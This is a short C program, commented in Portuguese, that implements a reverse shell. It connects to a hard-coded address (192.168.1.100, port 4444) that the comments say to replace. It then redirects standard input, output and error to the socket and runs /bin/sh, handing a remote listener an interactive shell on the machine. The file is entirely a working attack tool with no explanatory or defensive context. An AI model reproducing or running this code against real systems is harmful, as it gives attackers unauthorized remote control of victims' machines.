#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    int sock;
    struct sockaddr_in addr;
    char buffer;
    const char *ip = "192.168.1.100"; // trocar ip
    int port = 4444; // trocar porta 

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Falha ao criar socket");
        return 1;
    }

    // endereçamento
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Falha ao conectar");
        return 1;
    }

   
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

 
    execl("/bin/sh", "sh", NULL);

    return 0;
}
